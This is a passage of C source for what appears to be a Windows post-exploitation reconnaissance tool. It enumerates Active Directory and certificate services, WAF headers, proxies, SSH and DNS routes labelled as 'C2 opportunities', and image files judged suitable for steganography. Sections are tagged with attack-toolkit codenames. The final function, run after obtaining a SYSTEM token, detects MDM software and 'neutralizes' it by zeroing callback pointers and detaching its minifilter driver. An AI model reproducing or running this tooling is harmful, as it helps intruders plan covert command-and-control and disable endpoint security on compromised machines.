            } while (Process32Next(hSnapshot, &pe32));
            
            if (suspiciousCount > 0) {
                append_to_buffer(data, "[+] Found %d processes with suspicious parent IDs\n", suspiciousCount);
            }
        }
        CloseHandle(hSnapshot);
    }
    
    // Check for kernel drivers (potential rootkit)
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager != NULL) {
        DWORD dwBytesNeeded = 0;
        DWORD dwServicesReturned = 0;
        DWORD dwResumeHandle = 0;
        
        EnumServicesStatusA(hSCManager, SERVICE_DRIVER, SERVICE_STATE_ALL, NULL, 0, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle);
        
        if (dwBytesNeeded > 0) {
            LPENUM_SERVICE_STATUSA pServices = (LPENUM_SERVICE_STATUSA)malloc(dwBytesNeeded);
            if (pServices != NULL) {
                if (EnumServicesStatusA(hSCManager, SERVICE_DRIVER, SERVICE_STATE_ALL, pServices, dwBytesNeeded, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle)) {
                    append_to_buffer(data, "[+] Found %lu kernel drivers (potential rootkit location)\n", dwServicesReturned);
                }
                free(pServices);
            }
        }
        
        CloseServiceHandle(hSCManager);
    }
    
    return 0;
}

// 1.2 Active Directory & Certificate Services (ACTIVEGAME patterns)

int enumerate_ad_infrastructure(enum_data_t* data) {
    append_to_buffer(data, "\n=== ACTIVE DIRECTORY INFRASTRUCTURE (ACTIVEGAME PATTERNS) ===\n");
    
    // Get domain controller information using real Windows API
    PDOMAIN_CONTROLLER_INFOA pdcInfo = NULL;
    DWORD dwResult = DsGetDcNameA(NULL, NULL, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED, &pdcInfo);
    
    if (dwResult == ERROR_SUCCESS && pdcInfo != NULL) {
        append_to_buffer(data, "[+] Domain Controller found: %s\n", pdcInfo->DomainControllerName ? pdcInfo->DomainControllerName : "N/A");
        append_to_buffer(data, "    Domain: %s\n", pdcInfo->DomainName ? pdcInfo->DomainName : "N/A");
        append_to_buffer(data, "    Forest: %s\n", pdcInfo->DnsForestName ? pdcInfo->DnsForestName : "N/A");
        NetApiBufferFree(pdcInfo);
    } else {
        append_to_buffer(data, "[-] No domain controller found or not domain-joined\n");
    }
    
    // Check for domain trust relationships via registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "[+] Netlogon service configuration accessible\n");
        RegCloseKey(hKey);
    }
    
    return 0;
}

int enumerate_certificate_services(enum_data_t* data) {
    append_to_buffer(data, "\n--- Certificate Services (ADCS) ---\n");
    
    // Check for Certificate Services via registry using real Windows API
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\CertSvc", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "[+] Certificate Services (CertSvc) registry key found\n");
        
        // Check for configuration
        char configPath[MAX_PATH];
        DWORD cbData = MAX_PATH;
        if (RegQueryValueExA(hKey, "Configuration", NULL, NULL, (LPBYTE)configPath, &cbData) == ERROR_SUCCESS) {
            append_to_buffer(data, "    Configuration: %s\n", configPath);
        }
        
        RegCloseKey(hKey);
    }
    
    // Check for ADCS web enrollment using real Windows Service API
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager != NULL) {
        SC_HANDLE hService = OpenServiceA(hSCManager, "CertSvc", SERVICE_QUERY_STATUS);
        if (hService != NULL) {
            SERVICE_STATUS_PROCESS ssStatus;
            DWORD dwBytesNeeded;
            if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)) {
                if (ssStatus.dwCurrentState == SERVICE_RUNNING) {
                    append_to_buffer(data, "[+] Certificate Services (CertSvc) is running\n");
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    // Check for certificate stores using real Windows Crypto API
    HCERTSTORE hStore = CertOpenSystemStoreA(0, "MY");
    if (hStore != NULL) {
        append_to_buffer(data, "[+] Personal certificate store accessible\n");
        CertCloseStore(hStore, 0);
    }
    
    hStore = CertOpenSystemStoreA(0, "ROOT");
    if (hStore != NULL) {
        append_to_buffer(data, "[+] Root certificate store accessible\n");
        CertCloseStore(hStore, 0);
    }
    
    return 0;
}

int check_certificate_template_vulnerabilities(enum_data_t* data) {
    append_to_buffer(data, "\n--- Certificate Template Vulnerabilities ---\n");
    
    // Check for vulnerable certificate templates via registry using real Windows API
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography\\Services\\", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "[+] Certificate Services registry accessible\n");
        RegCloseKey(hKey);
    }
    
    // Check for web enrollment endpoints using real Windows Internet API
    HINTERNET hInternet = InternetOpenA("Enumerator", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet != NULL) {
        const char* adcsEndpoints[] = {
            "http://localhost/certsrv",
            "https://localhost/certsrv",
            "http://localhost/certsrv/certfnsh.asp"
        };
        
        for (int i = 0; i < sizeof(adcsEndpoints) / sizeof(adcsEndpoints[0]); i++) {
            HINTERNET hConnect = InternetOpenUrlA(hInternet, adcsEndpoints[i], NULL, 0, INTERNET_FLAG_RELOAD, 0);
            if (hConnect != NULL) {
                append_to_buffer(data, "[+] ADCS web enrollment endpoint accessible: %s\n", adcsEndpoints[i]);
                InternetCloseHandle(hConnect);
            }
        }
        
        InternetCloseHandle(hInternet);
    }
    
    return 0;
}

int detect_adcs_misconfigurations(enum_data_t* data) {
    append_to_buffer(data, "\n--- ADCS Misconfigurations ---\n");
    
    // Check for weak certificate template permissions using real Windows API
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "[+] ADCS configuration registry accessible\n");
        
        // Check for enrollment agent restrictions
        DWORD enrollmentAgent = 0;
        DWORD cbData = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "EnrollmentAgentRestriction", NULL, NULL, (LPBYTE)&enrollmentAgent, &cbData) == ERROR_SUCCESS) {
            if (enrollmentAgent == 0) {
                append_to_buffer(data, "    [!] Enrollment Agent restrictions disabled (potential misconfiguration)\n");
            }
        }
        
        RegCloseKey(hKey);
    }
    
    return 0;
}

// 1.3 WAF/Web Application Indicators (CORTISOL patterns)

int detect_waf_presence(enum_data_t* data) {
    append_to_buffer(data, "\n=== WAF/WEB APPLICATION INDICATORS (CORTISOL PATTERNS) ===\n");
    
    // Check for common WAF indicators via HTTP headers using real Windows Internet API
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet != NULL) {
        // Test common web endpoints for WAF detection
        const char* testUrls[] = {
            "http://localhost",
            "https://localhost",
            "http://127.0.0.1"
        };
        
        for (int i = 0; i < sizeof(testUrls) / sizeof(testUrls[0]); i++) {
            HINTERNET hConnect = InternetOpenUrlA(hInternet, testUrls[i], NULL, 0, INTERNET_FLAG_RELOAD, 0);
            if (hConnect != NULL) {
                char headerBuffer[4096];
                DWORD dwHeaderLen = sizeof(headerBuffer);
                
                if (HttpQueryInfoA(hConnect, HTTP_QUERY_RAW_HEADERS_CRLF, headerBuffer, &dwHeaderLen, NULL)) {
                    // Check for Cloudflare
                    if (strstr(headerBuffer, "cf-ray") != NULL || strstr(headerBuffer, "cloudflare") != NULL) {
                        append_to_buffer(data, "[+] Cloudflare WAF detected\n");
                    }
                    
                    // Check for AWS WAF
                    if (strstr(headerBuffer, "x-amzn-") != NULL || strstr(headerBuffer, "aws") != NULL) {
                        append_to_buffer(data, "[+] AWS WAF detected\n");
                    }
                    
                    // Check for Sucuri
                    if (strstr(headerBuffer, "x-sucuri") != NULL || strstr(headerBuffer, "sucuri") != NULL) {
                        append_to_buffer(data, "[+] Sucuri WAF detected\n");
                    }
                    
                    // Check for Imperva
                    if (strstr(headerBuffer, "x-iinfo") != NULL || strstr(headerBuffer, "imperva") != NULL) {
                        append_to_buffer(data, "[+] Imperva WAF detected\n");
                    }
                }
                
                InternetCloseHandle(hConnect);
            }
        }
        
        InternetCloseHandle(hInternet);
    }
    
    return 0;
}

int enumerate_web_application_tech(enum_data_t* data) {
    append_to_buffer(data, "\n--- Web Application Technology Detection ---\n");
    
    // Check for IIS using real Windows Service API
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager != NULL) {
        SC_HANDLE hService = OpenServiceA(hSCManager, "W3SVC", SERVICE_QUERY_STATUS);
        if (hService != NULL) {
            append_to_buffer(data, "[+] IIS (W3SVC) service found\n");
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    // Check for Apache using real Windows Service API
    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager != NULL) {
        SC_HANDLE hService = OpenServiceA(hSCManager, "Apache2.4", SERVICE_QUERY_STATUS);
        if (hService == NULL) {
            hService = OpenServiceA(hSCManager, "Apache", SERVICE_QUERY_STATUS);
        }
        if (hService != NULL) {
            append_to_buffer(data, "[+] Apache web server service found\n");
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    // Check for web application frameworks via registry using real Windows API
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\InetStp", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD majorVersion = 0;
        DWORD cbData = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "MajorVersion", NULL, NULL, (LPBYTE)&majorVersion, &cbData) == ERROR_SUCCESS) {
            append_to_buffer(data, "[+] IIS version: %lu\n", majorVersion);
        }
        RegCloseKey(hKey);
    }
    
    return 0;
}

int check_normalization_bypass_opportunities(enum_data_t* data) {
    append_to_buffer(data, "\n--- Normalization Bypass Opportunities ---\n");
    
    // Check for web server configuration using real Windows API
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\W3SVC\\Parameters", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "[+] IIS configuration registry accessible\n");
        
        // Check for URL normalization settings
        DWORD allowDoubleEscaping = 0;
        DWORD cbData = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "AllowDoubleEscaping", NULL, NULL, (LPBYTE)&allowDoubleEscaping, &cbData) == ERROR_SUCCESS) {
            if (allowDoubleEscaping != 0) {
                append_to_buffer(data, "    [!] Double escaping allowed (normalization bypass possible)\n");
            }
        }
        
        RegCloseKey(hKey);
    }
    
    return 0;
}

// 1.4 C2 Infrastructure Opportunities (ROCKHAMMER patterns)

int enumerate_c2_opportunities(enum_data_t* data) {
    append_to_buffer(data, "\n=== C2 INFRASTRUCTURE OPPORTUNITIES (ROCKHAMMER PATTERNS) ===\n");
    
    check_tunnel_proxy_opportunities(data);
    detect_dns_tunneling_opportunities(data);
    
    // Check for outbound connectivity using real Windows IP Helper API
    MIB_TCPTABLE_OWNER_PID* pTcpTable = NULL;
    DWORD dwSize = 0;
    DWORD dwRetVal = GetExtendedTcpTable(NULL, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    
    if (dwRetVal == ERROR_INSUFFICIENT_BUFFER) {
        pTcpTable = (MIB_TCPTABLE_OWNER_PID*)malloc(dwSize);
        if (pTcpTable != NULL) {
            dwRetVal = GetExtendedTcpTable(pTcpTable, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
            if (dwRetVal == NO_ERROR) {
                int outboundConnections = 0;
                for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
                    if (pTcpTable->table[i].dwState == MIB_TCP_STATE_ESTAB) {
                        struct in_addr remoteAddr;
                        remoteAddr.S_un.S_addr = pTcpTable->table[i].dwRemoteAddr;
                        // Check if connection is to external IP (not localhost/private)
                        if (remoteAddr.S_un.S_un_b.s_b1 != 127 && 
                            (remoteAddr.S_un.S_un_b.s_b1 != 192 || remoteAddr.S_un.S_un_b.s_b2 != 168) &&
                            (remoteAddr.S_un.S_un_b.s_b1 != 10)) {
                            outboundConnections++;
                        }
                    }
                }
                if (outboundConnections > 0) {
                    append_to_buffer(data, "[+] Found %d outbound connections (C2 opportunity)\n", outboundConnections);
                }
                free(pTcpTable);
            }
        }
    }
    
    return 0;
}

int check_tunnel_proxy_opportunities(enum_data_t* data) {
    append_to_buffer(data, "\n--- Tunnel/Proxy Opportunities ---\n");
    
    // Check for proxy configuration using real Windows API
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD proxyEnable = 0;
        DWORD cbData = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "ProxyEnable", NULL, NULL, (LPBYTE)&proxyEnable, &cbData) == ERROR_SUCCESS) {
            if (proxyEnable != 0) {
                append_to_buffer(data, "[+] Proxy configuration enabled\n");
                
                char proxyServer[256];
                cbData = sizeof(proxyServer);
                if (RegQueryValueExA(hKey, "ProxyServer", NULL, NULL, (LPBYTE)proxyServer, &cbData) == ERROR_SUCCESS) {
                    append_to_buffer(data, "    Proxy Server: %s\n", proxyServer);
                }
            }
        }
        RegCloseKey(hKey);
    }
    
    // Check for SSH tunnel capabilities using real Windows Service API
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager != NULL) {
        SC_HANDLE hService = OpenServiceA(hSCManager, "OpenSSH", SERVICE_QUERY_STATUS);
        if (hService == NULL) {
            hService = OpenServiceA(hSCManager, "sshd", SERVICE_QUERY_STATUS);
        }
        if (hService != NULL) {
            append_to_buffer(data, "[+] SSH service found (tunnel opportunity)\n");
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    return 0;
}

int detect_dns_tunneling_opportunities(enum_data_t* data) {
    append_to_buffer(data, "\n--- DNS Tunneling Opportunities ---\n");
    
    // Check DNS configuration using real Windows IP Helper API
    FIXED_INFO* pFixedInfo = NULL;
    ULONG ulOutBufLen = sizeof(FIXED_INFO);
    DWORD dwRetVal = GetNetworkParams(NULL, &ulOutBufLen);
    
    if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
        pFixedInfo = (FIXED_INFO*)malloc(ulOutBufLen);
        if (pFixedInfo != NULL) {
            dwRetVal = GetNetworkParams(pFixedInfo, &ulOutBufLen);
            if (dwRetVal == NO_ERROR) {
                append_to_buffer(data, "[+] DNS Server: %s\n", pFixedInfo->DnsServerList.IpAddress.String);
                append_to_buffer(data, "    Hostname: %s\n", pFixedInfo->HostName);
                append_to_buffer(data, "    Domain: %s\n", pFixedInfo->DomainName);
            }
            free(pFixedInfo);
        }
    }
    
    // Check for DNS query capabilities using real Windows Socket API
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) == 0) {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock != INVALID_SOCKET) {
            append_to_buffer(data, "[+] UDP socket creation successful (DNS tunneling possible)\n");
            closesocket(sock);
        }
        WSACleanup();
    }
    
    return 0;
}

// 1.5 Steganography Opportunities (SLEEPYMONEY patterns)

int enumerate_steganography_opportunities(enum_data_t* data) {
    append_to_buffer(data, "\n=== STEGANOGRAPHY OPPORTUNITIES (SLEEPYMONEY PATTERNS) ===\n");
    
    // Search for image files suitable for LSB steganography using real Windows API
    const char* searchPaths[] = {
        "C:\\Users\\Public\\Pictures",
        "C:\\Windows\\Web\\Wallpaper",
        "C:\\Program Files\\Windows Photo Viewer"
    };
    
    const char* imageExtensions[] = { ".png", ".jpg", ".jpeg", ".bmp", ".gif" };
    
    for (int pathIdx = 0; pathIdx < sizeof(searchPaths) / sizeof(searchPaths[0]); pathIdx++) {
        char searchPattern[MAX_PATH];
        snprintf(searchPattern, MAX_PATH, "%s\\*", searchPaths[pathIdx]);
        
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPattern, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            int imageCount = 0;
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char* ext = strrchr(findData.cFileName, '.');
                    if (ext != NULL) {
                        for (int extIdx = 0; extIdx < sizeof(imageExtensions) / sizeof(imageExtensions[0]); extIdx++) {
                            if (_stricmp(ext, imageExtensions[extIdx]) == 0) {
                                imageCount++;
                                char fullPath[MAX_PATH];
                                snprintf(fullPath, MAX_PATH, "%s\\%s", searchPaths[pathIdx], findData.cFileName);
                                analyze_file_entropy(data, fullPath);
                                break;
                            }
                        }
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            
            if (imageCount > 0) {
                append_to_buffer(data, "[+] Found %d image files in %s\n", imageCount, searchPaths[pathIdx]);
            }
            
            FindClose(hFind);
        }
    }
    
    return 0;
}

int analyze_file_entropy(enum_data_t* data, const char* filepath) {
    // Analyze file entropy using real file I/O
    FILE* file = fopen(filepath, "rb");
    if (file == NULL) {
        return -1;
    }
    
    // Read file and calculate entropy
    unsigned char buffer[4096];
    size_t bytesRead;
    long long byteCounts[256] = {0};
    long long totalBytes = 0;
    
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            byteCounts[buffer[i]]++;
            totalBytes++;
        }
    }
    
    fclose(file);
    
    if (totalBytes == 0) {
        return -1;
    }
    
    // Calculate Shannon entropy using log(x)/log(2.0) for Windows compatibility
    double entropy = 0.0;
    double log2 = log(2.0);
    for (int i = 0; i < 256; i++) {
        if (byteCounts[i] > 0) {
            double probability = (double)byteCounts[i] / totalBytes;
            entropy -= probability * (log(probability) / log2);
        }
    }
    
    // Normalize to 0-8 bits per byte
    if (entropy > 7.5) {
        append_to_buffer(data, "    [*] High entropy file (%.2f bits/byte): %s (suitable for steganography)\n", entropy, filepath);
    }
    
    return 0;
}

// MDM Detection and Neutralization (Step 1 after SYSTEM token)
int detect_and_neutralize_mdm(enum_data_t* data) {
    append_to_buffer(data, "\n=== MDM DETECTION AND NEUTRALIZATION ===\n");
    append_to_buffer(data, "Detecting MDM software and zeroing callback pointers...\n");
    
    // Detect MDM software
    mdm_detection_result_t mdm_results[10];
    int mdm_count = detect_mdm_software(mdm_results, 10);
    
    if (mdm_count > 0) {
        append_to_buffer(data, "[+] Detected %d MDM product(s):\n", mdm_count);
        
        for (int i = 0; i < mdm_count; i++) {
            append_to_buffer(data, "  - %s (detected via: %s)\n", 
                            mdm_results[i].mdm_name, 
                            mdm_results[i].detection_method);
            
            // Neutralize MDM by zeroing callback pointers
            append_to_buffer(data, "    [*] Neutralizing %s...\n", mdm_results[i].mdm_name);
            
            if (neutralize_mdm_software(&mdm_results[i]) == 0) {
                if (mdm_results[i].callback_zeroed) {
                    append_to_buffer(data, "    [+] MDM callback pointers zeroed\n");
                }
                if (mdm_results[i].driver_detached) {
                    append_to_buffer(data, "    [+] MDM minifilter driver detached\n");
                }
            } else {
                append_to_buffer(data, "    [-] Failed to neutralize MDM (continuing anyway)\n");
            }
        }
    } else {
        append_to_buffer(data, "[-] No MDM software detected\n");
    }
    
    append_to_buffer(data, "==========================================\n\n");
    return mdm_count;
}
